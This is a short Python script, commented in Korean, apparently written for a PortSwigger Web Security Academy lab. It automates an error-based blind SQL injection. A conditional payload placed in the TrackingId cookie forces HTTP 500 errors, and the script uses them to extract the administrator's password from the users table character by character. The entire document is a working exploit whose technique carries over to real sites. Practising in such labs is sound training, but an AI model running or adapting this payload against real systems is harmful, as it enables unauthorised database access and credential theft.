import requests
import string

# Case 2
# 주입한 조건부 쿼리가 참일 경우, 에러 발생(HTTP 500 Internal Server Error), 거짓일 경우 정상적인 페이지(HTTP Status Cdoe == 200) 
# Error-based Blind SQLi
# Burp Suite Academy Blind SQLi 실습 머신에 적용
# 실험실 URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
url = "https://0a14003b0357400280270325007a001e.web-security-academy.net/"
tracking_id = "trackingIdValue"
session_cookie = "sessionCookieValue"
username = "administrator"
password_length = 20

# 탐색할 문자 목록 (a-z, 0-9)
charset = string.ascii_lowercase + string.digits

def find_password():
    password = ""
    for i in range(1, password_length + 1): # 1 ~ 20까지 순회 # 비밀번호 20자리
        for char in charset:
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            cookies = {'TrackingId': tracking_id + payload, 'session': session_cookie}
            response = requests.get(url, cookies=cookies)
            
            if "Internal Server" in response.text:  # 탐지 성공 조건 # HTTP Status code == 500
                password += char
                print(f"현재까지 찾은 비밀번호: {password}")
                break

    return password

if __name__ == "__main__":
    found_password = find_password()
    print(f"완전한 비밀번호: {found_password}")
